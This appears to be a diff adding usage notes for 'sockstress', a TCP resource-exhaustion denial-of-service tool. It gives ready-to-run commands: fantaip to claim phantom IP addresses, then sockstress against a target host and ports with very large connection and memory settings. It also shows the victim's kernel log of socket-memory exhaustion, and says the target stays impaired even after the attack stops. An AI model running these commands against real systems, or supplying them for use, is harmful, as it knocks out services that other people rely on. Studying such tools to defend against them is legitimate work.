@@ -1,0 +1,54 @@
+run like
+
+get fantaip from unicornscan or something similar (if you need to arp a phantom ip address)
+
+fantaip -i eth0 -d 192.168.0.43/29
+
+then run the program like
+./sockstress -s 192.168.0.43/29 -d www.frog.com -p 80 -c -1 -m -1
+
+
+#### NOTES FOLLOWING ARE OLD #####
+
+we do:
+# fantaip -H 00:01:02:03:04:05 -i eth0 -d 192.168.13.44/29
+# ./sockstress -c 1000000 -d 192.168.13.120 -p22,25,80,10000 -s 192.168.13.44/29 -H 00:01:02:03:04:05 -vv -m 99999999 -S 500
+
+after a bit, we get...
+
+Out of socket memory
+printk: 4 messages suppressed.
+ip_conntrack: table full, dropping packet.
+ip_conntrack: table full, dropping packet.
+Out of socket memory
+Out of socket memory
+printk: 22 messages suppressed.
+ip_conntrack: table full, dropping packet.
+Out of socket memory
+Out of socket memory
+
+this is a mere 100k of bandwidth, even after the attack stops, the remote system has issues.
+
+with synflood protection enabled:
+
+possible SYN flooding on port 22. Sending cookies.
+Out of socket memory
+Out of socket memory
+TCP: too many of orphaned sockets
+TCP: too many of orphaned sockets
+TCP: too many of orphaned sockets
+Out of socket memory
+Out of socket memory
+TCP: too many of orphaned sockets
+Out of socket memory
+Out of socket memory
+printk: 1130 messages suppressed.
+Out of socket memory
+printk: 1145 messages suppressed.
+Out of socket memory
+printk: 1093 messages suppressed.
+Out of socket memory
+
+remote system info:
+	linux 2.6.?
+	1.5 Gig of ram
